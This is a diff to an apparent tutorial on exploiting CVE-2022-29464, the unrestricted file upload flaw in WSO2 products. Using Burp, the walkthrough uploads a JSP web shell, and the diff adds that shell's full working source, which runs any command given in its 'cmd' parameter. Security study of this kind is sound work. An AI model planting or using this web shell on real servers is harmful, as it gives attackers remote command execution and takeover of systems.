@@ -66,7 +66,7 @@ We can see that our target was found vulnerable by nuclei.
 
 ## Further CVE-2022-29464 exploitation
 
-We didn't talk at all about how this vulnerability works; the main idea is that the vulnerable WSO2 products allow unrestricted file upload which results in remote code execution. The main approach to succeed the vulnerability inside the WSO2 is to do a POST request which tries to upload a [web shell file](https://www.upguard.com/blog/what-are-web-shell-attacks) in JSP format on the target system.
+We didn't talk at all about how this vulnerability works; the main idea is that the vulnerable WSO2 products allow unrestricted file upload which results in remote code execution. This means that we can upload any file on the server. The main approach to succeed the vulnerability inside the WSO2 is to do a POST request which tries to upload a [web shell file](https://www.upguard.com/blog/what-are-web-shell-attacks) in JSP format on the target system.
 
 This web shell enables the target to be remotely accessed by the attacker, which can run commands on the system. After this POST request is made, another GET request to the web shell path endpoint to check if the vulnerability was successfully exploited.
 
@@ -100,6 +100,35 @@ Now, send the caught request to Repeater, using the **Ctrl+R** keyboard shortcut
 
 <img src="./assets/burp_repeater_dark.png" width=800 height=400>
 
+As we said before, we can upload any file on the WSO2 server, so we will try to upload a web shell file with the following content:
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
 
 # Further reading
 
